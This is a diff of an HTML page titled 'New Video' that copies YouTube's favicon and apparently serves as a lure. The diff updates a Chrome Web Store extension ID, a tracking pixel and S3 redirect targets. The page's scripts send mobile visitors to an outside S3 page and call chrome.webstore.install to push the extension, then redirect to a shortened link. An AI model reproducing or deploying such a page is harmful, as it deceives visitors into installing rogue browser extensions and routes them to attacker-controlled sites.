@@ -6,29 +6,29 @@
 
 
 
-<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/pblombickjefbkdnglkpkjacidhpgjmm">
+<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/keclmimojangimgkhhcbgfincomgengi">
 <link rel="shortcut icon" href="https://s.ytimg.com/yts/img/favicon-vfldLzJxy.ico" type="image/x-icon">
 
 <title>New Video</title>
 
-<script>new Image().src = '//whos.amung.us/widget/diti44pcpc.png';</script>
+<script>new Image().src = '//whos.amung.us/widget/pcpcditi1.png';</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
 <script type="text/javascript">
 if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)))
 {
-location.replace("https://s3.amazonaws.com/videoo568/s.html");
+location.replace("https://s3-us-west-2.amazonaws.com/redi1234/s.html");
 }
 
 
 if ( (navigator.userAgent.indexOf('Android') != -1) ) {
-document.location = "https://s3.amazonaws.com/videoo568/s.html";
+document.location = "https://s3-us-west-2.amazonaws.com/redi1234/s.html";
 }
 
 
 /*!function(a){var b=/iPhone/i,c=/iPod/i,d=/iPad/i,e=/(?=.*\bAndroid\b)(?=.*\bMobile\b)/i,f=/Android/i,g=/IEMobile/i,h=/(?=.*\bWindows\b)(?=.*\bTouch\b)/i,i=/BlackBerry/i,j=/Opera Mini/i,k=/(?=.*\bFirefox\b)(?=.*\bMobile\b)/i,l=new RegExp("(?:Nexus 7|BNTV250|Kindle Fire|Silk|GT-P1000)","i"),m=function(a,b){return a.test(b)},n=function(a){var n=a||navigator.userAgent;this.apple={phone:m(b,n),ipod:m(c,n),tablet:m(d,n),device:m(b,n)||m(c,n)||m(d,n)},this.android={phone:m(e,n),tablet:!m(e,n)&&m(f,n),device:m(e,n)||m(f,n)},this.windows={phone:m(g,n),tablet:m(h,n),device:m(g,n)||m(h,n)},this.other={blackberry:m(i,n),opera:m(j,n),firefox:m(k,n),device:m(i,n)||m(j,n)||m(k,n)},this.seven_inch=m(l,n),this.any=this.apple.device||this.android.device||this.windows.device||this.other.device||this.seven_inch,this.phone=this.apple.phone||this.android.phone||this.windows.phone,this.tablet=this.apple.tablet||this.android.tablet||this.windows.tablet},o=new n;o.Class=n,"undefined"!=typeof module&&module.exports?module.exports=o:"function"==typeof define&&define.amd&&define(o),a.isMobile=o}(this);
 if (isMobile.any || navigator.platform.toLowerCase().indexOf("win") == -1) {
 
-top.location.href="https://s3.amazonaws.com/videoo568/s.html";
+top.location.href="https://s3-us-west-2.amazonaws.com/redi1234/s.html";
 }*/</script>
   <script>
 
@@ -304,7 +304,7 @@ $("#dos").show();
  }
 }
 function chromex(){
-			 chrome.webstore.install("https://chrome.google.com/webstore/detail/pblombickjefbkdnglkpkjacidhpgjmm", function(){
+			 chrome.webstore.install("https://chrome.google.com/webstore/detail/keclmimojangimgkhhcbgfincomgengi", function(){
 				 var dax = new Image();
 dax.onload = function(){
 window.location = "http://goo.gl/hKDd87";
